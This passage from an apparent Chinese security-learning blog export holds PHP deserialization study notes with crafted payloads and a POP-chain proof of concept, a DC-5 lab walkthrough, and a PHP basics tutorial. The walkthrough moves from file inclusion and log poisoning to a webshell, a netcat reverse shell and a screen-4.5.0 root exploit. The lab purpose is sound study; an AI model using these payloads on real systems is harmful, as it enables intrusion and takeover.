serialize($a);\n?&gt;\n\n在编译器里直接运行上段代码可以看到，属性名前面有乱码，这里其实就是加了二进制的00\n\nurl编码一下再输出，就可以直观的看到了\n\n\n反序列化的知识特性1.反序列化之后的内容为一个对象\n2.反序列化生成的对象里面的值，由反序列化里的值提供；与原有类预定的值无关\n3.反序列化不触发类的成员方法；需要调用方法后才能触发\n反序列化的作用将序列化后的参数还原成实例化的对象\n\n1.反序列化之后的内容为一个对象\n代码演示：\n\n2.反序列化生成的对象里面的值，由反序列化里的值提供；与原有类预定的值无关\n代码演示：\n\n3.反序列化不触发类的成员方法；需要调用方法后才能触发\n代码演示：\n\n反序列化漏洞利用前面提到，反序列化生成的对象里面的值，由反序列化里的值提供；与原有类预定的值无关\n反序列化漏洞的成因：反序列化过程中，unserialie()接收的值 (字符串)可控;通过更改这个值(字符串)，得到所需要的代码，即生成的对象的属性值。\n然后根据反序列化不触发类的成员方法；需要调用方法后才能触发，通过调用方法，触发代码执行\n例题源码：\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass test&#123;\n    public $a &#x3D; &#39;echo &quot;this is test!!&quot;;&#39;;\n    public function displayVar() &#123;\n        eval($this-&gt;a);\n    &#125;\n&#125;\n\n$get &#x3D; $_GET[&quot;benben&quot;];\n$b &#x3D; unserialize($get);\n$b-&gt;displayVar() ;\n\n?&gt;\n\n构造漏洞利用代码\n&lt;?php\n\nclass test&#123;\n    public $a &#x3D; &#39;system(&quot;ls&quot;);&#39;;\n    public function displayVar() &#123;\n        eval($this-&gt;a);\n    &#125;\n&#125;\n\n$a &#x3D;new test();\necho serialize($a);\n\n得到payload：O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&quot;ls&quot;);&quot;;&#125;\n最后执行\n\n魔术方法简介什么是魔术方法？一个预定义好的，在特定情况下自动触发的行为方法\n通俗的说就是在执行了某个动作之前或者之后会触发的动作\n魔术方法的作用反序列化漏洞的成因:反序列化过程中，unserialize()接收的值 (字符串)可控;通过更改这个值(字符串)， 得到所需要的代码;通过调用方法，触发代码执行。\n魔术方法在特定条件下自动调用相关方法。最终导致触发代码\n魔术方法相关机制\n触发时机最为重要，一定要掌握\n魔术方法的简单分类\n_construct()构造函数，在实例化一个对象的时候，首先会去自动执行的一一个方法\n触发时机:实例化对象\n功能:提前清理不必要内容\n参数:非必要\n返回值:\n演示代码：\n&lt;?php\nhighlight_file(__FILE__);\nclass User &#123;\n    public $username;\n    public function __construct($username) &#123;\n        $this-&gt;username &#x3D; $username;\n        echo &quot;触发了构造函数1次&quot; ;\n    &#125;\n&#125;\n$test &#x3D; new User(&quot;benben&quot;);  &#x2F;&#x2F;实例化对象时触发构造函数_ construct()\n$ser &#x3D; serialize($test);\nunserialize($ser);\n\n?&gt;\n    \n&#x2F;&#x2F;结果：只触发了一次\n\n在实例化对象时触发，在序列化和反序列化过程中不会触发\n\n_destruct析构函数，在 用被删除或者当对象被显式销毁时执行的魔术方法\n触发时机:对象引用完成,或对象被销毁\n代码演示：\n&lt;?php\nhighlight_file(__FILE__);\nclass User &#123;\n    public function __destruct()\n    &#123;\n        echo &quot;触发了析构函数1次&quot;.&quot;&lt;br &#x2F;&gt;&quot; ;\n    &#125;\n&#125;\n$test &#x3D; new User(&quot;benben&quot;);  &#x2F;&#x2F;实例化对象结束后，代码运行完会销毁，触发析构函数_ destruct()\n$ser &#x3D; serialize($test);\nunserialize($ser);  &#x2F;&#x2F;在反序列化过程中会触发\n\n?&gt;\n&#x2F;&#x2F;触发了析构函数1次\n&#x2F;&#x2F;触发了析构函数1次\n\n\n简单例题\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    var $cmd &#x3D; &quot;echo &#39;dazhuang666!!&#39;;&quot; ;\n    public function __destruct()\n    &#123;\n        eval ($this-&gt;cmd);\n    &#125;\n&#125;\n$ser &#x3D; $_GET[&quot;benben&quot;];\nunserialize($ser);\n\n?&gt;\n\n运行结果\n\n_sleep()\n\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nclass User &#123;\n    const SITE &#x3D; &#39;uusama&#39;;\n    public $username;\n    public $nickname;\n    private $password;\n    public function __construct($username, $nickname, $password)    &#123;\n        $this-&gt;username &#x3D; $username;\n        $this-&gt;nickname &#x3D; $nickname;\n        $this-&gt;password &#x3D; $password;\n    &#125;\n    public function __sleep() &#123;\n        return array(&#39;username&#39;, &#39;nickname&#39;);\n    &#125;\n&#125;\n$user &#x3D; new User(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;);\necho serialize($user);\n?&gt;\n\n&#x2F;&#x2F; O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;\n\n_wakeup\n代码演示\n?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    const SITE &#x3D; &#39;uusama&#39;;\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n    public function __wakeup() &#123;\n        $this-&gt;password &#x3D; $this-&gt;username;\n    &#125;\n&#125;\n$user_ser &#x3D; &#39;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#39;;\nvar_dump(unserialize($user_ser));\n?&gt;\n&#x2F;&#x2F;object(User)#1 (4) &#123; [&quot;username&quot;]&#x3D;&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]&#x3D;&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]&#x3D;&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]&#x3D;&gt; NULL &#125;\n\n例题\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    const SITE &#x3D; &#39;uusama&#39;;\n    public $username;\n    public $nickname;\n    private $password;\n    private $order;\n    public function __wakeup() &#123;\n        system($this-&gt;username);\n    &#125;\n&#125;\n$user_ser &#x3D; $_GET[&#39;benben&#39;];\nunserialize($user_ser);\n?&gt;\n\npayload：O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:2:&quot;id&quot;;&#125;\n执行结果：\n\n_toString()\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    var $benben &#x3D; &quot;this is test!!&quot;;\n         public function __toString()\n         &#123;\n             return &#39;格式不对，输出不了!&#39;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\nprint_r($test);\necho &quot;&lt;br &#x2F;&gt;&quot;;\necho $test;  &#x2F;&#x2F;这里是把$test当成字符串输出了，导致_toString（）执行\n?&gt;\nUser Object ( [benben] &#x3D;&gt; this is test!! )\n格式不对，输出不了!\n\n\n_invoke()\n代码演示\n\n错误调用相关魔术方法_call()\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public function __call($arg1,$arg2)\n    &#123;\n        echo &quot;$arg1,$arg2[0]&quot;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\n$test -&gt; callxxx(&#39;a&#39;);\n?&gt;\n\ncallxxx,a\n\n_callStatic()\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public function __callStatic($arg1,$arg2)\n    &#123;\n        echo &quot;$arg1,$arg2[0]&quot;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\n$test::callxxx(&#39;a&#39;);\n?&gt;\n\ncallxxx,a\n\n_get()\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public $var1;\n    public function __get($arg1)\n    &#123;\n        echo  $arg1;\n    &#125;\n&#125;\n$test &#x3D; new User() ;\n$test -&gt;var2;\n?&gt;\n\nvar2\n\n_set()\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    public $var1;\n    public function __set($arg1 ,$arg2)\n    &#123;\n        echo  $arg1.&#39;,&#39;.$arg2;\n    &#125;\n&#125;\n$test &#x3D; new User() ;\n$test -&gt;var2&#x3D;1;\n?&gt;\n\nvar2,1\n\n_isset()\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    private $var;\n    public function __isset($arg1 )\n    &#123;\n        echo  $arg1;\n    &#125;\n&#125;\n$test &#x3D; new User() ;\nisset($test-&gt;var);\n?&gt;\n\nvar\n\n_unset()\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    private $var;\n    public function __unset($arg1 )\n    &#123;\n        echo  $arg1;\n    &#125;\n&#125;\n$test &#x3D; new User() ;\nunset($test-&gt;var);\n?&gt;\n\nvar\n\n_clone()\n代码演示\n&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass User &#123;\n    private $var;\n    public function __clone( )\n    &#123;\n        echo  &quot;__clone test&quot;;\n          &#125;\n&#125;\n$test &#x3D; new User() ;\n$newclass &#x3D; clone($test)\n?&gt;\n__clone test\n\n总结\n\npop链前置知识例题代码?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass index &#123;\n    private $test;\n    public function __construct()&#123;\n        $this-&gt;test &#x3D; new normal();\n    &#125;\n    public function __destruct()&#123;\n        $this-&gt;test-&gt;action();\n    &#125;\n&#125;\nclass normal &#123;\n    public function action()&#123;\n        echo &quot;please attack me&quot;;\n    &#125;\n&#125;\nclass evil &#123;\n    var $test2;\n    public function action()&#123;\n        eval($this-&gt;test2);\n    &#125;\n&#125;\nunserialize($_GET[&#39;test&#39;]);\n?&gt;\n\n思路:反推法\npoc\n&lt;?php\n&#x2F;&#x2F;highlight_file(__FILE__);\n&#x2F;&#x2F;error_reporting(0);\nclass index &#123;\n    private $test;\n    public function __construct()&#123;\n        $this-&gt;test &#x3D; new evil();\n    &#125;\n&#x2F;&#x2F;    public function __destruct()&#123;\n&#x2F;&#x2F;        $this-&gt;test-&gt;action();\n&#x2F;&#x2F;    &#125;\n&#125;\n&#x2F;&#x2F;class normal &#123;\n&#x2F;&#x2F;    public function action()&#123;\n&#x2F;&#x2F;        echo &quot;please attack me&quot;;\n&#x2F;&#x2F;    &#125;\n&#x2F;&#x2F;&#125;\nclass evil &#123;\n    var $test2&#x3D;&quot;system(&#39;id&#39;);&quot;;\n&#x2F;&#x2F;    public function action()&#123;\n&#x2F;&#x2F;        eval($this-&gt;test2);\n&#x2F;&#x2F;    &#125;\n&#125;\n&#x2F;&#x2F;unserialize($_GET[&#39;test&#39;]);\n\n&#x2F;&#x2F;$a &#x3D; new index();\n&#x2F;&#x2F;echo urlencode(serialize($a));\necho serialize(new index());\n&#x2F;&#x2F;echo urlencode(serialize(new index()));\n?&gt;\n\npayload\nO:5:&quot;index&quot;:1:&#123;s:11:&quot; index test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;id&#39;);&quot;;&#125;&#125;\n\n注意,此时构造出来的payload有一部分需要进行url编码\n\nO:5:&quot;index&quot;:1:&#123;s:11:&quot;%00index%00test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;id&#39;);&quot;;&#125;&#125;\n\n也可以直接url输出:echo urlencode(serialize(new index()));\nO%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A13%3A%22system%28%27id%27%29%3B%22%3B%7D%7D\n\n\n还有另一种写法\n&lt;?php\nclass index\n&#123;\n    var $test;\n&#125;\nclass evil\n&#123;\n    var $test2;\n&#125;\n$a &#x3D; new evil();\n$a-&gt;test2&#x3D;&quot;system(&#39;ls&#39;);&quot;;\n$b&#x3D;new index();\n$b-&gt;test&#x3D;$a;\necho serialize($b);\n\n?&gt;\n\nO:5:&quot;index&quot;:1:&#123;s:4:&quot;test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;&#125;\n\n但这种方法得到的payload要改一下其中的值\n因为index类中的成员属性$test的修饰符是private,而我写poc的时候改成了public\n所以正确的payload应该是:将第一个test改为”%00index%00test\nO:5:&quot;index&quot;:1:&#123;s:11:&quot;%00index%00test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&#39;ls&#39;);&quot;;&#125;&#125;\n\n\n建议修饰符为public时才这么做,不然改起来太麻烦了\n魔术方法触发规则\n演示\n\n\npoc\n\npop链构造,poc编写\n例题源码\n&lt;?php\n&#x2F;&#x2F;flag is in flag.php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Modifier &#123;\n    private $var;\n    public function append($value)\n    &#123;\n        include($value);\n        echo $flag;\n    &#125;\n    public function __invoke()&#123;\n        $this-&gt;append($this-&gt;var);\n    &#125;\n&#125;\n\nclass Show&#123;\n    public $source;\n    public $str;\n    public function __toString()&#123;\n        return $this-&gt;str-&gt;source;\n    &#125;\n    public function __wakeup()&#123;\n        echo $this-&gt;source;\n    &#125;\n&#125;\n\nclass Test&#123;\n    public $p;\n    public function __construct()&#123;\n        $this-&gt;p &#x3D; array();\n    &#125;\n\n    public function __get($key)&#123;\n        $function &#x3D; $this-&gt;p;\n        return $function();\n    &#125;\n&#125;\n\nif(isset($_GET[&#39;pop&#39;]))&#123;\n    unserialize($_GET[&#39;pop&#39;]);\n&#125;\n?&gt;\n\n思路\n\n\npoc\n","slug":"php反序列化漏洞学习","date":"2023-02-11T02:27:57.686Z","categories_index":"学习笔记","tags_index":"php,漏洞","author_index":"Abyssaler"},{"id":"a5f05b43c45d522768da0aaf98592442","title":"DC-5靶机渗透","content":"DC-5靶机渗透全流程一：实验环境kali攻击机：192.168.235.130\ndc-5：192.168.235.131\n二：信息收集主机发现因为是在内网环境，所以直接用arp-scan\narp-scan -l\n可以发现目标靶机的ip地址192.168.235.131\n\n端口扫描先用masscan对端口进行一个快速的扫描\nmasscan --rate=10000 --ports 0-65535 192.168.235.131\n可以发现开启了80，111，38732端口\n\n再用nmap对端口进行详细的扫描\nnmap -sV -p80,111,38732 -A  192.168.235.131 \n可以发现中间件用的nginx，服务器是Linux操作系统\n\n访问网页访问80端口的网页，目前没有收集到可用信息\n\nburp suite抓包分析访问网页的contact栏，发现有可以交互的地方\n\n\n思考这个地方可能会产生注入点\n先抓个包看看\n\n通过不停的send请求，发现版本信息在变化\n\n\n\n浏览web页面，发现每次提交联系表单后，都会重定向到一个thankyou.php的页面\n且版本会随着改变\n\n分析到这里，只发现了这个异常点，但是对渗透依然没有头绪，扫描一下目录看看\n目录扫描dirsearch -u http://192.168.235.131/ -e*\n\n看到有一个之前没有访问过的页面footer.php\n尝试访问一下\n发现就是版本信息的页面，而且随着刷新版本号还不同\n\n这里就可以想到，之前的thankyou.php页面是调用了现在这个footer.php来显示内容的\n三：渗透测试思路hankyou.php页面是调用了现在这个footer.php来显示内容\n形式应该为192.168.235.131/thankyou.php?file=footer.php\n这里得到参数名是file还有得出是通过get传参其实是没有什么根据的，只能说根据以往的经验姑且这么试一试，发现正好可以访问\n\n\n文件包含漏洞既然发现了文件包含，自然就想到有文件包含漏洞了\n用wfuzz爆破一下路径看看\nwfuzz -w /usr/share/wordlists/wfuzz/general/test.txt  -w /usr/share/wordlists/wfuzz/general/lujing.txt http://192.168.235.131/thankyou.php?FUZZ=FUZZ\n\n\n\n\n\n\n\n\n\nwfuzz的使用\nhttps://www.freebuf.com/column/163632.html\nhttps://blog.csdn.net/JBlock/article/details/88619117\nhttps://www.ddosi.org/wfuzz-guide/\n\n尝试访问下http://192.168.235.131/thankyou.php?file=/etc/passwd\n\n证明有文件包含漏洞了\n尝试通过日志文件来拿shell通过日志文件查看访问网站的请求\nhttp://192.168.235.131/thankyou.php?file=/var/log/nginx/access.log\n\n我们可以利用这个特点写入一段代码程序，传递到web服务器，这样这段代码程序会被写入到日志文件中\n然后我们可以利用文件包含漏洞读取网站的日志文件去执行这段代码\n用burp suite写入恶意代码\n先上传一句phpinfo，看是否可以执行\n\n执行成功，同理就可以执行其他php代码\n\n蚁剑连接\n\n蚁剑上打开虚拟终端，然后反弹shell\nkali上开启监听nc -lvvp 4444\n\n蚁剑终端输入nc 192.168.235.130 4444 -e /bin/bash \n\n提权获取交互式shell\npython -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\n查找具有SUID 标志的命令\nfind / -perm -4000 2&gt;/dev/null\n\n搜索一下screen-4.5.0这个一看就很特殊的文件\n看到有可利用的脚本\n\n先进入脚本的目录，把脚本复制到桌面，然后在桌面开启kali的http服务，把这个脚本下载到靶机\ncp /usr/share/exploitdb/exploits/linux/local/41154.sh /root/Desktop\n\nkali 在当前目录下开启http 服务\npython3 -m http.server 2222\n在靶机中下载脚本，在靶机的tmp目录下下载，因为&#x2F;tmp目录的权限大\nwget http://192.168.235.130:2222/41154.sh\n\n给执行权限\nchmod 777 41154.sh\n\n尝试执行，执行成功\n\n\n查看flag\n\n","slug":"DC-5靶机渗透","date":"2023-02-07T02:19:39.442Z","categories_index":"渗透从入门到入土","tags_index":"DC系列靶机","author_index":"Abyssaler"},{"id":"20917cafe9bad9b66ec14a8de4e80fe8","title":"PHP编程与开发","content":"PHP基本使用PHP基础PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言\nPHP 是什么？\nPHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。\nPHP 脚本在服务器上执行。\nPHP 可免费下载使用。\n\nPHP 文件是什么？\nPHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码\nPHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器\nPHP 文件的默认文件扩展名是 “.php”\n\nPHP 能做什么？\nPHP 可以生成动态页面内容\nPHP 可以创建、打开、读取、写入、关闭服务器上的文件\nPHP 可以收集表单数据\nPHP 可以发送和接收 cookies\nPHP 可以添加、删除、修改您的数据库中的数据\nPHP 可以限制用户访问您的网站上的一些页面\nPHP 可以加密数据\n\n为什么使用 PHP？\nPHP 可在不同的平台上运行（Windows、Linux、Unix、Mac OS X 等）\nPHP 与目前几乎所有的正在被使用的服务器相兼容（Apache、IIS 等）\nPHP 提供了广泛的数据库支持\nPHP 易于学习，并可高效地运行在服务器端\n\nPHP语法PHP 脚本可以放在文档中的任何位置。\nPHP 脚本以  结束：\nPHP 文件的默认文件扩展名是 “.php”。\nPHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;h1&gt;My first PHP page&lt;&#x2F;h1&gt;\n\n&lt;?php\necho &quot;Hello World!&quot;;\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\nPHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。\n通过 PHP，有两种在浏览器输出文本的基础指令：echo 和 print。\nPHP 注释\n&#x2F;&#x2F;      单行注释\n&#x2F;*  *&#x2F;   多行注释\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n&lt;?php\n&#x2F;&#x2F; 这是 PHP 单行注释\n\n&#x2F;*\n这是\nPHP 多行\n注释\n*&#x2F;\n?&gt;\n\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n变量变量是用于存储信息的”容器”\n&lt;?php\n$x&#x3D;5;\n$y&#x3D;6;\n$z&#x3D;$x+$y;\necho $z;\n?&gt;\n\n\n\nPHP 变量规则\n\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）\n\n创建PHP变量PHP 没有声明变量的命令。\n变量在您第一次赋值给它的时候被创建\n&lt;?php\n$txt&#x3D;&quot;Hello world!&quot;;\n$x&#x3D;5;\n$y&#x3D;10.5;\n?&gt;\n\n在上面的语句执行中，变量 txt 将保存值 **Hello world!**，且变量 x 将保存值 5。\n注释：当您赋一个文本值给变量时，请在文本值两侧加上引号。\nPHP 是一门弱类型语言PHP 会根据变量的值，自动把变量转换为正确的数据类型。\n在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。\necho 和 print 语句echo 和 print 区别:\n\necho - 可以输出一个或多个字符串\nprint - 只允许输出一个字符串，返回值总为 1\n\n提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。\necho 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。\n显示字符串\n&lt;?php\necho &quot;&lt;h2&gt;PHP 很有趣!&lt;&#x2F;h2&gt;&quot;;\necho &quot;Hello world!&lt;br&gt;&quot;;\necho &quot;我要学 PHP!&lt;br&gt;&quot;;\necho &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;\n?&gt;\n\n\n\n显示变量\n&lt;?php\n$txt1&#x3D;&quot;学习 PHP&quot;;\n$txt2&#x3D;&quot;xbxaq.com&quot;;\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n \necho $txt1;\necho &quot;&lt;br&gt;&quot;;\necho &quot;在 $txt2 学习 PHP &quot;;\necho &quot;&lt;br&gt;&quot;;\necho &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;\n?&gt;\n\n\n\nprint 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。\n显示字符串\n&lt;?php\nprint &quot;&lt;h2&gt;PHP 很有趣!&lt;&#x2F;h2&gt;&quot;;\nprint &quot;Hello world!&lt;br&gt;&quot;;\nprint &quot;我要学习 PHP!&quot;;\n?&gt;\n\n\n\n显示变量\n&lt;?php\n$txt1&#x3D;&quot;学习 PHP&quot;;\n$txt2&#x3D;&quot;xbxaq.COM&quot;;\n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\n \nprint $txt1;\nprint &quot;&lt;br&gt;&quot;;\nprint &quot;在 $txt2 学习 PHP &quot;;\nprint &quot;&lt;br&gt;&quot;;\nprint &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;\n?&gt;\n\n\n\n数据类型PHP 变量存储不同的类型的数据，不同的数据类型可以做不一样的事情。\nPHP 支持以下几种数据类型:\n\nString（字符串）\nInteger（整型）\nFloat（浮点型）\nBoolean（布尔型）\nArray（数组）\nObject（对象）\nNULL（空值）\nResource（资源类型）\n\n字符串一个字符串是一串字符的序列，就像 “Hello world!”。\n你可以将任何文本放在单引号和双引号中\n&lt;?php \n$x &#x3D; &quot;Hello world!&quot;;\necho $x;\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; &#39;Hello world!&#39;;\necho $x;\n?&gt;\n\n\n\n整型整数是一个没有小数的数字。\n整数规则:\n\n整数必须至少有一个数字 (0-9)\n整数不能包含逗号或空格\n整数是没有小数点的\n整数可以是正数或负数\n整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）。\n\nPHP var_dump() 函数返回变量的数据类型和值\n&lt;?php \n$x &#x3D; 5985;\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; -345; &#x2F;&#x2F; 负数 \nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; 0x8C; &#x2F;&#x2F; 十六进制数\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;;\n$x &#x3D; 047; &#x2F;&#x2F; 八进制数\nvar_dump($x);\n?&gt;\n\n\n\n浮点型浮点数是带小数部分的数字，或是指数形式\n&lt;?php \n$x &#x3D; 10.365;\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; 2.4e3;\nvar_dump($x);\necho &quot;&lt;br&gt;&quot;; \n$x &#x3D; 8E-5;\nvar_dump($x);\n?&gt;\n\n\n\n布尔型布尔型可以是 TRUE 或 FALSE\n布尔型通常用于条件判断\n数组数组可以在一个变量中存储多个值\n&lt;?php \n$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);\nvar_dump($cars);\n?&gt;\n\n\n\n对象对象数据类型也可以用于存储数据。\n在 PHP 中，对象必须声明。\n首先，你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。\n然后我们在类中定义数据类型，然后在实例化的类中使用数据类型\n&lt;?php\nclass Car\n&#123;\n  var $color;\n  function __construct($color&#x3D;&quot;green&quot;) &#123;\n    $this-&gt;color &#x3D; $color;\n  &#125;\n  function what_color() &#123;\n    return $this-&gt;color;\n  &#125;\n&#125;\n?&gt;\n\n\n\nNULL 值NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。\nNULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。\n可以通过设置变量值为 NULL 来清空变量数据\n&lt;?php\n$x&#x3D;&quot;Hello world!&quot;;\n$x&#x3D;null;\nvar_dump($x);\n?&gt;\n\n\n\n类型比较虽然 PHP 是弱类型语言，但也需要明白变量类型及它们的意义，因为我们经常需要对 PHP 变量进行比较，包含松散和严格比较。\n\n松散比较：使用两个等号 &#x3D;&#x3D; 比较，只比较值，不比较类型。\n严格比较：用三个等号 &#x3D;&#x3D;&#x3D; 比较，除了比较值，也比较类型。\n\n例如，”42” 是一个字符串而 42 是一个整数。FALSE 是一个布尔值而 “FALSE” 是一个字符串。\n&lt;?php\nif(42 &#x3D;&#x3D; &quot;42&quot;) &#123;\n    echo &#39;1、值相等&#39;;\n&#125;\n \necho PHP_EOL; &#x2F;&#x2F; 换行符\n \nif(42 &#x3D;&#x3D;&#x3D; &quot;42&quot;) &#123;\n    echo &#39;2、类型相等&#39;;\n&#125; else &#123;\n    echo &#39;3、类型不相等&#39;;\n&#125;\n?&gt;\n\n\n\nPHP中 比较 0、false、null&lt;?php\necho &#39;0 &#x3D;&#x3D; false: &#39;;\nvar_dump(0 &#x3D;&#x3D; false);\necho &#39;0 &#x3D;&#x3D;&#x3D; false: &#39;;\nvar_dump(0 &#x3D;&#x3D;&#x3D; false);\necho PHP_EOL;\necho &#39;0 &#x3D;&#x3D; null: &#39;;\nvar_dump(0 &#x3D;&#x3D; null);\necho &#39;0 &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(0 &#x3D;&#x3D;&#x3D; null);\necho PHP_EOL;\necho &#39;false &#x3D;&#x3D; null: &#39;;\nvar_dump(false &#x3D;&#x3D; null);\necho &#39;false &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(false &#x3D;&#x3D;&#x3D; null);\necho PHP_EOL;\necho &#39;&quot;0&quot; &#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D; false);\necho &#39;&quot;0&quot; &#x3D;&#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D;&#x3D; false);\necho PHP_EOL;\necho &#39;&quot;0&quot; &#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D; null);\necho &#39;&quot;0&quot; &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;0&quot; &#x3D;&#x3D;&#x3D; null);\necho PHP_EOL;\necho &#39;&quot;&quot; &#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D; false);\necho &#39;&quot;&quot; &#x3D;&#x3D;&#x3D; false: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D;&#x3D; false);\necho PHP_EOL;\necho &#39;&quot;&quot; &#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D; null);\necho &#39;&quot;&quot; &#x3D;&#x3D;&#x3D; null: &#39;;\nvar_dump(&quot;&quot; &#x3D;&#x3D;&#x3D; null);\n\n\n\n常量常量值被定义后，在脚本的其他任何地方都不能被改变\n常量是一个简单值的标识符。该值在脚本中不能改变。\n一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符)。\n注意： 常量在整个脚本中都可以使用。\n设置常量，使用 define() 函数，函数语法如下\nbool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] )\n\n该函数有三个参数:\n\nname：必选参数，常量名称，即标志符。\nvalue：必选参数，常量的值。\ncase_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。\n\n创建一个 区分大小写的常量, 常量值为 “欢迎访问 xbxaq.com”\n&lt;?php\n&#x2F;&#x2F; 区分大小写的常量名\ndefine(&quot;GREETING&quot;, &quot;欢迎访问 xbxaq.com&quot;);\necho GREETING;    &#x2F;&#x2F; 输出 \necho &#39;&lt;br&gt;&#39;;\necho greeting;   &#x2F;&#x2F; 输出 &quot;greeting&quot;，但是有警告信息，表示该常量未定义\n?&gt;\n\n\n\n运算符 PHP 中，赋值运算符 &#x3D; 用于给变量赋值。\n在 PHP 中，算术运算符 + 用于把值加在一起。\n算术运算符&lt;?php \n$x&#x3D;10; \n$y&#x3D;6;\necho ($x + $y); &#x2F;&#x2F; 输出16\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x - $y); &#x2F;&#x2F; 输出4\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x * $y); &#x2F;&#x2F; 输出60\necho &#39;&lt;br&gt;&#39;;  &#x2F;&#x2F; 换行\n \necho ($x &#x2F; $y); &#x2F;&#x2F; 输出1.6666666666667\necho 